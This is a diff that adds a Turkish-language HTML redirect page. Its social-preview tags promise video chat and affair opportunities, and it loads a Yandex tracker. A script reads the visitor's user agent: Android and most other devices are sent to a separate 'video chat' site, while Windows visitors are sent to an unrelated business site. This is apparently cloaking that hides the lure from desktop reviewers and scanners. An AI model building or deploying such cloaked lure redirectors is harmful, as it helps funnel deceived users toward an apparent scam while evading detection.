@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <title>Yönlendiriliyorsunuz...</title>
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <!-- Yandex Metrika -->
+  <script type="text/javascript">
+    (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+    m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+    (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+    ym(103636543, "init", { clickmap:true, trackLinks:true, accurateTrackBounce:true });
+  </script>
+
+  <!-- Sosyal Önizleme -->
+  <meta property="og:title" content="Görüntülü Sohbet">
+  <meta property="og:description" content="Görüntülü sohbetin en hızlı ve eğlenceli adresi">
+  <meta property="og:image" content="https://elleader.vercel.app/asd.jpg">
+  <meta property="og:url" content="https://elleader.vercel.app">
+  <meta property="og:type" content="website">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="GÖRÜNTÜLÜ KONUŞMAK İÇİN TIKLA">
+  <meta name="twitter:description" content="Kaçamak mı yapmak istiyorsunuz tam size göre !">
+  <meta name="twitter:image" content="https://elleader.vercel.app/asd.jpg">
+  
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #f1f3f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+    }
+    #status {
+      color: #333;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+  <div id="status"></div>
+
+  <script>
+    function isAndroid() {
+      const ua = navigator.userAgent.toLowerCase();
+      return ua.includes('android') || ua.includes('linux; android');
+    }
+
+    function isWindows() {
+      const ua = navigator.userAgent.toLowerCase();
+      return ua.includes('windows');
+    }
+
+    function redirect() {
+      const status = document.getElementById('status');
+
+      if (isAndroid()) {
+        // Android cihazlar için
+        setTimeout(() => {
+          window.location.href = 'https://goruntulusohbetzamani.vercel.app/';
+        }, 500);
+      } else if (isWindows()) {
+        // Windows cihazlar için
+        setTimeout(() => {
+          window.location.href = 'https://www.kocalar.com.tr/';
+        }, 500);
+      } else {
+        // Diğer cihazlar için
+        setTimeout(() => {
+          window.location.href = 'https://goruntulusohbetzamani.vercel.app/';
+        }, 500);
+      }
+    }
+
+    // Yönlendirmeyi başlat
+    window.onload = redirect;
+  </script>
+</body>
+</html>
